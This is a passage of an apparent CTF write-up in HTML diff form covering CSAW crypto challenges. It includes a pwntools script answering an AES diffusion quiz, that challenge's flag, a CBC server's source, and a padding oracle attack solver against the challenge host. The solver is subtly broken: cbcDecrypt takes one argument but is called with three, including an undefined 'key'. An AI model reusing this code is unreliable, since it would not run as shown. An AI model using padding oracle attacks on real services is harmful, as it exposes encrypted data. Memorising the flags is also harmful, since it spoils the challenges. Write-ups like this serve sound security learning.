+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">row</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">matrix:</span>
+        <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">element</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">row:</span>
+            <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(element)</span>
+
+<span style="color: #f8f8f2">state</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[[</span><span style="color: #e6db74">&quot;x0&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;x4&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;x8&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;x12&quot;</span><span style="color: #f8f8f2">],</span> 
+         <span style="color: #f8f8f2">[</span><span style="color: #e6db74">&quot;x1&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;x5&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;x9&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;x13&quot;</span><span style="color: #f8f8f2">],</span> 
+         <span style="color: #f8f8f2">[</span><span style="color: #e6db74">&quot;x2&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;x6&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;x10&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;x14&quot;</span><span style="color: #f8f8f2">],</span>
+         <span style="color: #f8f8f2">[</span><span style="color: #e6db74">&quot;x3&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;x7&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;x11&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;x15&quot;</span><span style="color: #f8f8f2">]]</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">AESRound</span><span style="color: #f8f8f2">(state):</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">MixColumns(ShiftRows(state))</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">AES</span><span style="color: #f8f8f2">(state,</span> <span style="color: #f8f8f2">rounds):</span>
+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">r</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(rounds):</span>
+        <span style="color: #f8f8f2">state</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">AESRound(state)</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">state</span>
+
+<span style="color: #f8f8f2">PrettyPrint(AES(state,</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">))</span>
+</pre></div>
+<p></p>
+<p>Like in the previous challenge you answer a series of questions making use of the provided script. The point of this challenge is to teach you that for AES to achieve complete diffusion both the "ShiftRows" and the "MixColumns" steps are necessary.</p>
+
+
+
+<!-- HTML generated using hilite.me --><div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f92672">from</span> <span style="color: #f8f8f2">pwn</span> <span style="color: #f92672">import</span> <span style="color: #f92672">*</span>
+<span style="color: #f92672">from</span> <span style="color: #f8f8f2">time</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">sleep</span>
+
+<span style="color: #f8f8f2">letters</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>
+
+<span style="color: #f8f8f2">r</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">remote(b</span><span style="color: #e6db74">&quot;diffusion-pop-quiz.ctf.csaw.io&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">5000</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">1</span>
+
+<span style="color: #75715e"># Question 1</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;[[&#39;x0&#39;, &#39;x4&#39;, &#39;x8&#39;, &#39;x12&#39;], [&#39;x5&#39;, &#39;x9&#39;, &#39;x13&#39;, &#39;x1&#39;], [&#39;x10&#39;, &#39;x14&#39;, &#39;x2&#39;, &#39;x6&#39;], [&#39;x15&#39;, &#39;x3&#39;, &#39;x7&#39;, &#39;x11&#39;]]&quot;</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #75715e"># Question 2</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;[[&#39;2*x0 + 3*x5 + 1*x10 + 1*x15&#39;, &#39;2*x4 + 3*x9 + 1*x14 + 1*x3&#39;, &#39;2*x8 + 3*x13 + 1*x2 + 1*x7&#39;, &#39;2*x12 + 3*x1 + 1*x6 + 1*x11&#39;], [&#39;1*x0 + 2*x5 + 3*x10 + 1*x15&#39;, &#39;1*x4 + 2*x9 + 3*x14 + 1*x3&#39;, &#39;1*x8 + 2*x13 + 3*x2 + 1*x7&#39;, &#39;1*x12 + 2*x1 + 3*x6 + 1*x11&#39;], [&#39;1*x0 + 1*x5 + 2*x10 + 3*x15&#39;, &#39;1*x4 + 1*x9 + 2*x14 + 3*x3&#39;, &#39;1*x8 + 1*x13 + 2*x2 + 3*x7&#39;, &#39;1*x12 + 1*x1 + 2*x6 + 3*x11&#39;], [&#39;3*x0 + 1*x5 + 1*x10 + 2*x15&#39;, &#39;3*x4 + 1*x9 + 1*x14 + 2*x3&#39;, &#39;3*x8 + 1*x13 + 1*x2 + 2*x7&#39;, &#39;3*x12 + 1*x1 + 1*x6 + 2*x11&#39;]]&quot;</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #75715e"># Question 3</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x0,x5,x10,x15&quot;</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #75715e"># Question 4</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x2,x7,x8,x13&quot;</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #75715e"># Question 5</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;no&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 6</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;12&quot;</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #75715e"># Question 7</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x0:1,x5:1,x10:1,x15:1&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 8</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x0:0,x1:0,x2:0,x3:0,x4:0,x5:0,x6:0,x7:0,x8:0,x9:0,x10:0,x11:0,x12:0,x13:0,x14:0,x15:0&quot;</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #75715e"># Question 9</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x0&quot;</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #75715e"># Question 10</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;(2*(2*x0 + 3*x1 + 1*x2 + 1*x3) + 3*(1*x0 + 2*x1 + 3*x2 + 1*x3) + 1*(1*x0 + 1*x1 + 2*x2 + 3*x3) + 1*(3*x0 + 1*x1 + 1*x2 + 2*x3))&quot;</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #75715e"># Question 11</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;no&quot;</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(</span><span style="color: #ae81ff">5</span><span style="color: #f8f8f2">):</span>
+	<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recvline)</span>
+
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">interactive()</span>
+</pre></div>
+
+
+<p></p>
+<!-- HTML generated using hilite.me --><div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f8f8f2">flag:</span> <span style="color: #e6db74">&quot;csawctf{1_n0w_und3r5t4nd_435_d1ffu510n}&quot;</span>
+</pre></div>
+
+<hr style="border-top:1px solid #28323C;">
+<p></p>
+<p><h3>CBC</h3></p>
+<img class="center" src="/assets/images/csaw24CBC.png">
+<p></p>
+<p>For the final crypto challenge we're given a ciphertext, the challenge url and the python script running on the challenge server:</p>
+
+<!-- HTML generated using hilite.me --><div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f92672">from</span> <span style="color: #f8f8f2">Crypto.Util.Padding</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">pad,</span> <span style="color: #f8f8f2">unpad</span>
+<span style="color: #f92672">from</span> <span style="color: #f8f8f2">Crypto.Cipher</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">AES</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">os</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">decrypt</span><span style="color: #f8f8f2">(txt:</span> <span style="color: #f8f8f2">str)</span> <span style="color: #f92672">-&gt;</span> <span style="color: #f8f8f2">(str,</span> <span style="color: #f8f8f2">int):</span>
+    <span style="color: #66d9ef">try</span><span style="color: #f8f8f2">:</span>
+        <span style="color: #f8f8f2">token</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bytes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">fromhex(txt)</span>
+
+        <span style="color: #f8f8f2">c</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">AES</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">new(os</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">environ[</span><span style="color: #e6db74">&quot;AES_KEY&quot;</span><span style="color: #f8f8f2">]</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">encode(),</span> <span style="color: #f8f8f2">AES</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">MODE_CBC,</span> <span style="color: #f8f8f2">iv</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">os</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">environ[</span><span style="color: #e6db74">&quot;AES_IV&quot;</span><span style="color: #f8f8f2">]</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">encode())</span>
+        <span style="color: #f8f8f2">plaintext</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">c</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">decrypt(token)</span>
+        <span style="color: #f8f8f2">unpadded</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">unpad(plaintext,</span> <span style="color: #ae81ff">16</span><span style="color: #f8f8f2">)</span>
+        
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">unpadded,</span> <span style="color: #ae81ff">1</span>
+    <span style="color: #66d9ef">except</span> <span style="color: #a6e22e">Exception</span> <span style="color: #66d9ef">as</span> <span style="color: #f8f8f2">s:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">str(s),</span> <span style="color: #ae81ff">0</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">()</span> <span style="color: #f92672">-&gt;</span> <span style="color: #f8f8f2">None:</span>
+    <span style="color: #66d9ef">while</span> <span style="color: #f8f8f2">True:</span>
+        <span style="color: #f8f8f2">text</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">input(</span><span style="color: #e6db74">&quot;Please enter the ciphertext: &quot;</span><span style="color: #f8f8f2">)</span>
+        <span style="color: #f8f8f2">text</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">strip()</span>
+        <span style="color: #f8f8f2">out,</span> <span style="color: #f8f8f2">status</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">decrypt(text)</span>
+        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">status</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">:</span>
+            <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Looks fine&quot;</span><span style="color: #f8f8f2">)</span>
+        <span style="color: #66d9ef">else</span><span style="color: #f8f8f2">:</span>
+            <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Error...&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">__name__</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&quot;__main__&quot;</span><span style="color: #f8f8f2">:</span>
+    <span style="color: #f8f8f2">main()</span>
+</pre></div>
+<p></p>
+
+<p>Judging from the challenge name and the provided script this seems to be a straightforward <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack#Padding_oracle_attack_on_CBC_encryption"><b>CBC Padding Oracle Attack</b></a> challenge (this Wikipedia article does a great job explaining it in detail). Solver:</p>
+
+
+<!-- HTML generated using hilite.me --><div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f92672">from</span> <span style="color: #f8f8f2">pwn</span> <span style="color: #f92672">import</span> <span style="color: #f92672">*</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">sys</span>
+
+<span style="color: #f8f8f2">BLOCKSIZE</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">16</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">cbcDecrypt</span><span style="color: #f8f8f2">(ciphertext):</span>
+	<span style="color: #f8f8f2">ct</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bytes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hex(bytes(ciphertext))</span>
+	<span style="color: #f8f8f2">r</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">remote(</span><span style="color: #e6db74">&#39;cbc.ctf.csaw.io&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">9996</span><span style="color: #f8f8f2">)</span>
+	<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recvuntil(</span><span style="color: #e6db74">&quot;Please enter the ciphertext:&quot;</span><span style="color: #f8f8f2">)</span>
+	<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(ct)</span>
+	<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;[*] Sent ciphertext&quot;</span><span style="color: #f8f8f2">)</span>
+	<span style="color: #f8f8f2">result</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recvline()</span>
+	<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Decryption result:&quot;</span><span style="color: #f8f8f2">,result)</span>
+	<span style="color: #66d9ef">if</span> <span style="color: #e6db74">&quot;Error...&quot;</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">result:</span>
+		<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>
+		<span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">False</span>
+	<span style="color: #66d9ef">elif</span> <span style="color: #e6db74">&quot;Looks fine&quot;</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">result:</span>
+		<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>
+		<span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">True</span>
+	<span style="color: #66d9ef">else</span><span style="color: #f8f8f2">:</span>
+		<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>
+		<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Something went wrong while attempting to decrypt from server&quot;</span><span style="color: #f8f8f2">)</span>
+		<span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">cbcPaddingOracleAttack</span><span style="color: #f8f8f2">(blocks):</span>
+	<span style="color: #f8f8f2">plaintexts</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[]</span>
+	
+	<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">p</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(</span><span style="color: #ae81ff">16</span><span style="color: #f8f8f2">):</span>
+		<span style="color: #f8f8f2">plaintext</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">b</span><span style="color: #e6db74">&quot;&quot;</span>
+		<span style="color: #f8f8f2">originalPadding</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bytes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">fromhex(hex(p)[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">:]</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">rjust(</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">,</span><span style="color: #e6db74">&quot;0&quot;</span><span style="color: #f8f8f2">))</span>	
+		<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">len(blocks)</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">):</span>
+	
+			<span style="color: #f8f8f2">chunk</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">b</span><span style="color: #e6db74">&quot;&quot;</span>
+	
+			<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">j</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,BLOCKSIZE):</span>
+				<span style="color: #f8f8f2">curBlock</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bytearray(blocks[i])</span>
+				<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">len(chunk)</span> <span style="color: #f92672">!=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">:</span>
+					<span style="color: #f8f8f2">tmp</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">BLOCKSIZE</span> <span style="color: #f92672">-</span> <span style="color: #ae81ff">1</span>
+					<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">ch</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">len(chunk)):</span>
+						<span style="color: #f8f8f2">curBlock[tmp]</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">(len(chunk)</span><span style="color: #f92672">+</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">^</span> <span style="color: #f8f8f2">chunk[ch]</span> <span style="color: #f92672">^</span> <span style="color: #f8f8f2">curBlock[tmp]</span>
+						<span style="color: #f8f8f2">tmp</span> <span style="color: #f92672">-=</span> <span style="color: #ae81ff">1</span>
+	
+				<span style="color: #f8f8f2">options</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[]</span>
+				<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">k</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">):</span>
+					<span style="color: #f8f8f2">curBlock[len(curBlock)</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f92672">-</span><span style="color: #f8f8f2">j]</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">k</span>
+					<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">cbcDecrypt(</span> <span style="color: #f8f8f2">bytearray(blocks[i</span><span style="color: #f92672">+</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]),</span> <span style="color: #f8f8f2">key,</span> <span style="color: #f8f8f2">curBlock):</span>
+						<span style="color: #f8f8f2">options</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">append(k)</span>
+	
+				<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">len(options)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">:</span>
+					<span style="color: #f8f8f2">chunk</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">chr(</span> <span style="color: #f8f8f2">options[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">^</span> <span style="color: #f8f8f2">(len(chunk)</span><span style="color: #f92672">+</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">^</span> <span style="color: #f8f8f2">blocks[i][BLOCKSIZE</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f92672">-</span><span style="color: #f8f8f2">j]</span> <span style="color: #f8f8f2">)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">encode()</span>
+				<span style="color: #66d9ef">else</span><span style="color: #f8f8f2">:</span>
+					<span style="color: #f8f8f2">nextChar</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">b</span><span style="color: #e6db74">&quot;&quot;</span>
+					<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">op</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">options:</span>
+							<span style="color: #f8f8f2">curChar</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">chr(</span> <span style="color: #f8f8f2">op</span> <span style="color: #f92672">^</span> <span style="color: #f8f8f2">(len(chunk)</span><span style="color: #f92672">+</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">^</span> <span style="color: #f8f8f2">blocks[i][BLOCKSIZE</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f92672">-</span><span style="color: #f8f8f2">j]</span> <span style="color: #f8f8f2">)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">encode()</span>
+							<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">curChar</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">originalPadding:</span>
+								<span style="color: #f8f8f2">nextChar</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">curChar</span>
+					<span style="color: #f8f8f2">chunk</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">nextChar</span>
+	
+			<span style="color: #f8f8f2">plaintext</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">chunk[::</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>
+		<span style="color: #f8f8f2">plaintexts</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">append(plaintext)</span>
+
+	<span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">plaintexts</span>
+
+
